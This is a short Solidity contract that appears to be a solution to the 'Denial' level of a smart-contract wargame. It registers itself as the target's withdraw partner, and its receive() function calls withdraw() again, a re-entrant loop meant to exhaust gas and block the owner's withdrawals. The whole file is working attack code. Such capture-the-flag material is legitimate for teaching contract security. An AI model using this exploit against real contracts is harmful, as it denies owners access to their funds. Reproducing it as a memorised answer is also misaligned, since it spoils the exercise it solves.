// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Denial.sol';

contract DenialSolution {
  Denial denial;
  
  constructor(address payable _denial) public {
    denial = Denial(_denial);
  }

  function setPartner() external {
    denial.setWithdrawPartner(address(this));
  }

  receive() external payable {
    denial.withdraw();
  }
}